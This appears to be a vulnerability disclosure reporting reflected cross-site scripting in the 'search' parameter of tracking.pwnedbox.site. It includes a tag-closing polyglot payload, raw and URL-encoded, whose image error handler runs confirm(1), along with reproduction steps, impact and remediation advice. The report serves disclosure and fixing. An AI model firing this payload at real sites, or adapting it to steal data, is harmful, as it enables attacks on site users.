## Title
Reflected XSS - tracking.pwnedbox.site

## Description
The `search` GET parameter on `tracking.pwnedbox.site` was found vulnerable to Reflected Cross-Site Scripting (XSS). A crafted HTML context-breakout payload using an image error event handler successfully triggered a `confirm(1)` dialog in the browser.

## Steps to Reproduce

1. Open the target website:
   ```text
   https://tracking.pwnedbox.site/
   ```

2. Open the following crafted URL in a browser:
   ```text
   https://tracking.pwnedbox.site/?search=%27%22%3C%21--%3E%29%3C%2FTitle%2F%3C%2Fh1%2F%3C%2Fh2%2F%3C%2Fh3%2F%3C%2Fh4%2F%3C%2Fdiv%2F%3C%2Fp%2F%3C%2Fa%2F%3C%2Ffont%2F%3C%2Flabel%2F%3C%2Fbutton%2F%3C%2Fimg%2F%3C%2Ful%2F%3C%2Fol%2F%3C%2Fli%2F%3C%2Foption%2F%3C%2Fspan%2F%3C%2FStyle%2F%3C%2FScript%2F%3C%2FtextArea%2F%3C%2FiFrame%2F%3C%2FnoScript%3E%3CImg+Src%3DOnXSS+OnError%3D%28confirm%29%281%29%3E
   ```

3. Allow the page to load.

4. Observe the JavaScript confirmation dialog displaying `1`, confirming successful JavaScript execution.

5. Dismiss the confirmation dialog.

## POC (Proof of Concept)

**Target URL:**  
https://tracking.pwnedbox.site/

**HTTP Method:** GET

**Vulnerable Parameter:** `search`

**Payload:**
```html
'"<!-->)</Title/</h1/</h2/</h3/</h4/</div/</p/</a/</font/</label/</button/</img/</ul/</ol/</li/</option/</span/</Style/</Script/</textArea/</iFrame/</noScript><Img Src=OnXSS OnError=(confirm)(1)>
```

**Crafted Request URL:**
```text
https://tracking.pwnedbox.site/?search=%27%22%3C%21--%3E%29%3C%2FTitle%2F%3C%2Fh1%2F%3C%2Fh2%2F%3C%2Fh3%2F%3C%2Fh4%2F%3C%2Fdiv%2F%3C%2Fp%2F%3C%2Fa%2F%3C%2Ffont%2F%3C%2Flabel%2F%3C%2Fbutton%2F%3C%2Fimg%2F%3C%2Ful%2F%3C%2Fol%2F%3C%2Fli%2F%3C%2Foption%2F%3C%2Fspan%2F%3C%2FStyle%2F%3C%2FScript%2F%3C%2FtextArea%2F%3C%2FiFrame%2F%3C%2FnoScript%3E%3CImg+Src%3DOnXSS+OnError%3D%28confirm%29%281%29%3E
```

**Observed Result:**

The crafted payload was successfully executed through the `search` parameter. The injected image's error event handler triggered a JavaScript confirmation dialog containing `1`, confirming Reflected Cross-Site Scripting (XSS).

**Screenshot:**

<img width="1920" height="1200" alt="image" src="https://github.com/user-attachments/assets/2137db0a-d185-4dbb-b341-a7969522c1bf" />

<img width="1920" height="1200" alt="image" src="https://github.com/user-attachments/assets/be4bed83-83d0-4921-b978-cef8e8905cad" />

## Impact

- An attacker can craft a malicious URL and trick victims into opening it.
- Successful exploitation allows JavaScript execution in the victim's browser.
- The vulnerability may be abused for phishing or manipulation of displayed webpage content.

## Remediation

- Apply context-aware output encoding to the `search` parameter before rendering its value in HTML.
- Sanitize user-controlled input and prevent injection of HTML elements and event handlers.
- Implement a restrictive Content Security Policy (CSP) to block unauthorized inline JavaScript execution.
